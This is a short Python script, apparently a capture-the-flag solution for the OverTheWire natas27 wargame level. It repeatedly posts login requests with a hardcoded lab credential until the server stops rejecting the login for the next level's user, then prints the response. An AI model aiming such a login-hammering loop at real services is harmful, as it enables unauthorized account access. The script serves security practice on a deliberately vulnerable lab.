# -*- coding: utf-8 -*-
"""
Created on Sat Mar 28 15:51:04 2015

@author: George
"""

import requests

keep_going=True
 
while keep_going: 
    r = requests.post('http://natas27.natas.labs.overthewire.org',
            auth=('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'),
             params={'username':'natas28','password':''})
     

    if 'Wrong password' not in r.content: 
        keep_going=False
        print r.content
        
